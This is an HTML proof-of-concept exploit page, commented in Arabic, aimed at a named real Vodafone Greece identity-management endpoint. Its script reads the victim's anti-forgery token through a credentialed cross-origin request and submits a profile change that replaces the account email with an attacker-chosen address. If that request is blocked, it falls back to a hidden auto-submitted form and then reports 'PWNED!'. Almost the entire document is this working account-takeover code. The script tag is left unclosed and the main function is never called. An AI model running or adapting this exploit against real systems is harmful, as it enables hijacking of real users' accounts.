<!DOCTYPE html>
<html>
<head>
    <title>PoC Executing...</title>
</head>
<body>
    <div id="msg">Initializing...</div>

    <script>
        // 1. تعريف المتغيرات الأساسية أولاً
        const target = "https://identity.facilitymanagement.iot.vodafone.gr/identity/Manage";

        // 2. الدالة (نفس الكود اللي معك بس تأكد إنه داخل سكريبت)
        async function executePackageDoom() {
    try {
        document.getElementById('msg').innerText = "Step 1: Sniffing Token...";
        
        // سحب التوكن (GET)
        const response = await fetch(target, { method: 'GET', credentials: 'include' });
        const html = await response.text();
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        const token = doc.querySelector('input[name="__RequestVerificationToken"]')?.value;

        if (!token) {
            document.getElementById('msg').innerText = "❌ Token missing! (Session expired?)";
            return;
        }

        document.getElementById('msg').innerText = "Step 2: Bypassing Security & Sending Payload...";

        const newEmail = `hacked_${Math.random().toString(36).substring(7)}@vodafone-poc.io`;
        
        // بناء الـ FormData يدوياً لضمان التنسيق الصحيح 100%
        const details = {
            'IsEmailConfirmed': 'True',
            'Email': newEmail,
            'PhoneNumber': '',
            'Name': 'Xia0Checkmate',
            'Website': '',
            'Profile': '',
            'StreetAddress': '',
            'Locality': '12',
            'Region': '',
            'PostalCode': '',
            'Country': '',
            '__RequestVerificationToken': token // التوكن المسروق
        };

        let formBody = [];
        for (let property in details) {
            let encodedKey = encodeURIComponent(property);
            let encodedValue = encodeURIComponent(details[property]);
            formBody.push(encodedKey + "=" + encodedValue);
        }
        formBody = formBody.join("&");

        // إرسال الطلب النهائي
        const postRes = await fetch(target, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                // أحياناً السيرفر بيطلب التوكن هون كمان (اختياري)
                'RequestVerificationToken': token 
            },
            body: formBody,
            credentials: 'include'
        });

        // إذا أعطى 400، رح نجرب طريقة الـ Form الصامت (The Silent Form)
        if (postRes.status === 400) {
             document.getElementById('msg').innerText = "⚠️ Fetch blocked by 400. Launching Silent Form Hijack...";
             submitSilentForm(details);
        } else {
             document.getElementById('msg').innerHTML = "<h2 style='color:green'>✅ PWNED!</h2>";
        }

    } catch (err) {
        document.getElementById('msg').innerText = "❌ Error: " + err.message;
    }
}

// دالة احتياطية في حال فشل الـ Fetch بسبب سياسات الـ CORS Strict على الـ POST
function submitSilentForm(data) {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = target;
    
    for (const key in data) {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = key;
        input.value = data[key];
        form.appendChild(input);
    }
    document.body.appendChild(form);
    form.submit();
}

    </body>
        </html>
